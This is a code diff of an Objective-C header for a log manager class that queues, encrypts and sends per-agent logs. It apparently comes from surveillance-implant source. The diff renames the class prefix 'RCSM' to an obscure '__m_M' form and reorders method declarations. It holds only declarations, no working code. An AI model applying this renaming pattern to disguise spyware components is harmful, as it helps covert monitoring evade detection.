@@ -38,7 +38,7 @@ typedef struct _log {
   u_int additionalDataLength; // Size of additional data if present
 } logStruct;
 
-@class RCSMEncryption;
+@class __m_MEncryption;
 
 //
 // Basically there are 2 possible queues:
@@ -61,7 +61,7 @@ enum {
 //  - logName
 //  - handle
 
-@interface RCSMLogManager : NSObject
+@interface __m_MLogManager : NSObject
 {
 @private
   NSMutableArray *mActiveQueue;
@@ -69,10 +69,10 @@ enum {
   NSMutableArray *mTempQueue;
   
 @private
-  RCSMEncryption *mEncryption;
+  __m_MEncryption *mEncryption;
 }
 
-+ (RCSMLogManager *)sharedInstance;
++ (__m_MLogManager *)sharedInstance;
 + (id)allocWithZone: (NSZone *)aZone;
 - (id)copyWithZone: (NSZone *)aZone;
 - (id)init;
@@ -91,23 +91,6 @@ enum {
 - (BOOL)createLog: (u_int)agentID
       agentHeader: (NSData *)anAgentHeader
         withLogID: (u_int)logID;
-
-//
-// @author
-//  revenge
-// @abstract
-//  Close ALL the logs in the mActiveQueue and move them inside the mSendQueue
-//
-- (BOOL)closeActiveLogsAndContinueLogging: (BOOL)continueLogging;
-
-//
-// @author
-//  revenge
-// @abstract
-//  Close a single active log and move it to the mSendQueue
-//
-- (BOOL)closeActiveLog: (u_int)agentID
-             withLogID: (u_int)logID;
 
 //
 // @author
@@ -132,10 +115,26 @@ enum {
 // @author
 //  revenge
 // @abstract
+//  Close ALL the logs in the mActiveQueue and move them inside the mSendQueue
+//
+- (BOOL)closeActiveLogsAndContinueLogging: (BOOL)continueLogging;
+
+//
+// @author
+//  revenge
+// @abstract
 //  Remove a single log from the mSendQueue
 //
 - (BOOL)removeSendLog: (u_int)agentID
             withLogID: (u_int)logID;;
+//
+// @author
+//  revenge
+// @abstract
+//  Close a single active log and move it to the mSendQueue
+//
+- (BOOL)closeActiveLog: (u_int)agentID
+             withLogID: (u_int)logID;
 
 - (NSMutableArray *)mActiveQueue;
 - (NSEnumerator *)getActiveQueueEnumerator;
